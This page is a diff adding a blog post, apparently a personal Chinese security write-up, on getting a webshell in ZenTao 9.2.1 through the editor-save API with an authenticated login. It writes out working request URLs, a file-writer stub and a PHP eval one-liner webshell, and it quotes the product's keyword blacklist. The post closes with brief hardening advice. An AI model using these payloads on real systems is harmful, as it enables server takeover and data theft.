@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+<!-- Google Analytics -->
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-110514158-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+<!-- End Google Analytics -->
+
+
+    
+
+    
+<!-- Baidu Tongji -->
+<script>var _hmt = _hmt || []</script>
+<script async src="//hm.baidu.com/hm.js?a61423a9e09966d6384b1b3d64e97484"></script>
+<!-- End Baidu Tongji -->
+
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <link rel="canonical" href="true/安全/记一次禅道渗透/">
+    
+    
+    <title>记一次禅道渗透并获取webshell | hooklife&#39;s blog | 这个世界会好么？</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="渗透,webshell">
+    <meta name="description" content="有登陆权限,对 9.2.1 版本禅道渗透,获取webshell">
+<meta name="keywords" content="渗透,webshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次禅道渗透并获取webshell">
+<meta property="og:url" content="https://hooklife.me/安全/记一次禅道渗透/index.html">
+<meta property="og:site_name" content="hooklife&#39;s blog">
+<meta property="og:description" content="有登陆权限,对 9.2.1 版本禅道渗透,获取webshell">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://hooklife.me/img/zentao_webshell/result.png">
+<meta property="og:updated_time" content="2020-04-14T03:59:02.087Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次禅道渗透并获取webshell">
+<meta name="twitter:description" content="有登陆权限,对 9.2.1 版本禅道渗透,获取webshell">
+<meta name="twitter:image" content="https://hooklife.me/img/zentao_webshell/result.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="hooklife&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">hooklife</h5>
+          <a href="mailto:miaogaopeng123@gmail.com" title="miaogaopeng123@gmail.com" class="mail">miaogaopeng123@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/hooklife" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">记一次禅道渗透并获取webshell</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">记一次禅道渗透并获取webshell</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-03-12T09:33:32.000Z" itemprop="datePublished" class="page-time">
+  2018-03-12
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#确认版本"><span class="post-toc-number">1.</span> <span class="post-toc-text">确认版本</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#文件上传"><span class="post-toc-number">2.</span> <span class="post-toc-text">文件上传</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">总结</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#蛋疼"><span class="post-toc-number">4.</span> <span class="post-toc-text">蛋疼</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-记一次禅道渗透"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">记一次禅道渗透并获取webshell</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-03-12 17:33:32" datetime="2018-03-12T09:33:32.000Z"  itemprop="datePublished">2018-03-12</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>有登陆权限,对 9.2.1 版本禅道渗透,获取webshell<br><a id="more"></a></p>
+<h1 id="确认版本"><a href="#确认版本" class="headerlink" title="确认版本"></a>确认版本</h1><p>首先通过接口获取禅道版本<br><a href="http://127.0.0.1/index.php?mode=getconfig" target="_blank" rel="noopener">http://127.0.0.1/index.php?mode=getconfig</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"9.2.1"</span>,</span><br><span class="line">  <span class="string">"requestType"</span>: <span class="string">"PATH_INFO"</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:http://127.0.0.1/?m=api&amp;f=getModel&amp;moduleName=editor&amp;methodName=save&amp;params=filePath=a.php</span><br><span class="line">Method:POST</span><br><span class="line">Payload:fileContent=&lt;?php $_POST[1]($_POST[2]);</span><br></pre></td></tr></table></figure>
+<p>直接提交发现报错:<br> 无法写入，可能没有权限。请尝试执行 chmod 777 -R a.ph  具体什么原因我也不太清楚</p>
+<p>查看源代码 module/editor/model.php 371行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $fileContent = <span class="keyword">$this</span>-&gt;post-&gt;fileContent;</span><br><span class="line">    $evils       = <span class="keyword">array</span>(<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'passthru'</span>, <span class="string">'proc_open'</span>, <span class="string">'shell_exec'</span>, <span class="string">'system'</span>, <span class="string">'$$'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'assert'</span>);</span><br><span class="line">    $gibbedEvils = <span class="keyword">array</span>(<span class="string">'e v a l'</span>, <span class="string">'e x e c'</span>, <span class="string">' p a s s t h r u'</span>, <span class="string">' p r o c _ o p e n'</span>, <span class="string">'s h e l l _ e x e c'</span>, <span class="string">'s y s t e m'</span>, <span class="string">'$ $'</span>, <span class="string">'i n c l u d e'</span>, <span class="string">'r e q u i r e'</span>, <span class="string">'a s s e r t'</span>);</span><br><span class="line">    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);</span><br><span class="line"></span><br><span class="line">    $dirPath = dirname($filePath);</span><br><span class="line">    $extFilePath = substr($filePath, <span class="number">0</span>, strpos($filePath, DS . <span class="string">'ext'</span> . DS) + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(!is_dir($dirPath) <span class="keyword">and</span> is_writable($extFilePath)) mkdir($dirPath, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(is_writable($dirPath))</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filePath, $fileContent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(js::alert(<span class="keyword">$this</span>-&gt;lang-&gt;editor-&gt;notWritable . $extFilePath));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现写入文件路径也可以控制.</p>
+<p>随便访问个URL让他弹出错误信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: the control file /opt/zbox/app/zentao/module/indaafasf/control.php not found. in /opt/zbox/app/zentao/framework/base/router.class.php on line 1238, last called by /opt/zbox/app/zentao/framework/base/router.class.php on line 1357 through function setControlFile.</span><br><span class="line">in /opt/zbox/app/zentao/framework/base/router.class.php on line 1932 when visiting indaafasf</span><br></pre></td></tr></table></figure>
+<p>发现禅道路径在 /opt/zbox/app/zentao/</p>
+<p>查看源码得知 www 目录为可直接访问目录</p>
+<p>直接上传文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:http://127.0.0.1/?m=api&amp;f=getModel&amp;moduleName=editor&amp;methodName=save&amp;params=filePath=/opt/zbox/app/zentao/www/aaaaaa.php</span><br><span class="line">Method:POST</span><br><span class="line">Payload:fileContent=&lt;?php file_put_contents($_POST[1],$_POST[2]);</span><br></pre></td></tr></table></figure></p>
+<p>访问上传后的文件 跳过检测上传一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL:http://127.0.0.1/aaaaaa.php</span><br><span class="line">Method:POST</span><br><span class="line">Payload:</span><br><span class="line">1=/opt/zbox/app/zentao/www/b.php</span><br><span class="line">2=&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>最后上一张菜刀图<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zentao_webshell/result.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种上传文件的地方已经要做好路径/文件后缀名的限制. 可以上传的目录一定不要给PHP的权限.</p>
+<h1 id="蛋疼"><a href="#蛋疼" class="headerlink" title="蛋疼"></a>蛋疼</h1><p>最后拿到了数据库发现管理员的密码竟然是默认密码…白忙活了这么多</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-04-14T03:59:02.087Z" itemprop="dateUpdated">2020-04-14 11:59:02</time>
+</span><br>
+
+
+        
+        原始链接：<a href="/安全/记一次禅道渗透/" target="_blank" rel="external">https://hooklife.me/安全/记一次禅道渗透/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://hooklife.me">
+            <img src="/img/avatar.png" alt="hooklife">
+            hooklife
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webshell/">webshell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://hooklife.me/安全/记一次禅道渗透/&title=《记一次禅道渗透并获取webshell》 — hooklife's blog&pic=https://hooklife.me/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://hooklife.me/安全/记一次禅道渗透/&title=《记一次禅道渗透并获取webshell》 — hooklife's blog&source=有登陆权限,对 9.2.1 版本禅道渗透,获取webshell" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://hooklife.me/安全/记一次禅道渗透/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《记一次禅道渗透并获取webshell》 — hooklife's blog&url=https://hooklife.me/安全/记一次禅道渗透/&via=https://hooklife.me" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://hooklife.me/安全/记一次禅道渗透/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/安全/某企业官网的一次渗透/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">某企业官网的一次渗透</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/前端/ubuntu中使用webpack,部分文件不能自动reload的解决方法/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">ubuntu中使用webpack,部分文件不能自动reload的解决方法</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>hooklife &copy; 2015 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://hooklife.me/安全/记一次禅道渗透/&title=《记一次禅道渗透并获取webshell》 — hooklife's blog&pic=https://hooklife.me/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://hooklife.me/安全/记一次禅道渗透/&title=《记一次禅道渗透并获取webshell》 — hooklife's blog&source=有登陆权限,对 9.2.1 版本禅道渗透,获取webshell" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://hooklife.me/安全/记一次禅道渗透/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《记一次禅道渗透并获取webshell》 — hooklife's blog&url=https://hooklife.me/安全/记一次禅道渗透/&via=https://hooklife.me" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://hooklife.me/安全/记一次禅道渗透/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACK0lEQVR42u3aQXLDIBBEUd3/0mTrKsWouwc7YfisUrEs8bTAQw/XJY/xMl7/c7/mfr1y5bunLB4wYMDYljGmw2XM76Nj7HvCgAHjAEb2GAU5fzX6NQ9zhgEDBoxpuTaEoZeMMGDAgPGdBVffBisLMQwYMGDoC6W7yOrbVD22W7AXhwEDxoYMPXX//t8f6W/AgAFjK8YwhxuuVV6TMSsYMGC0ZugLnB6QZbGasql+uAMMGDBaM/RtatYkyAI4ZW6X8g5gwICxOUMv79yoy21GZgfRYMCAcRqjHvdnRzTs4u/+KQwYMFoz1i6mWQDnHq14iNtgwIDRmqF3BpV6rH5NqcsKAwaMdoyMVFkus+mWtrUwYMDYluEeHnUXYv1uldwMBgwYJzAq5ZobvVWeaO/CYcCA0YiRtQTW8rLDFr/8bsCAAaMdI8uv9AKu/t2sOQoDBoxOjGXtw8L2NQvjHn43YMCA0YjhLnx69JZNvQSAAQPGAQwp2DJDumyZVgpEGDBgnMZwi8J6Gq9P0ViaYcCAcQxjbaNRL/jsAxYwYMA4mJEdEVMenzUDjG/BgAGjKWOYoxLM6Ztbt6CEAQNGb4Z72EKP3txtsN4KXXBmBAYMGBsy/iwgi9oSb18rDBgwDmDoC58brmXF5RxZittgwIBxDGM+uQyQlZIwYMCAUTmQ4cZnevvzI6UhDBgw/j2j0gyo5HxZhAcDBozTGO7WMYvys7JycVMTBgwY+zF+AK4PYL4x5U8tAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/src/js/waves.min.js">
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
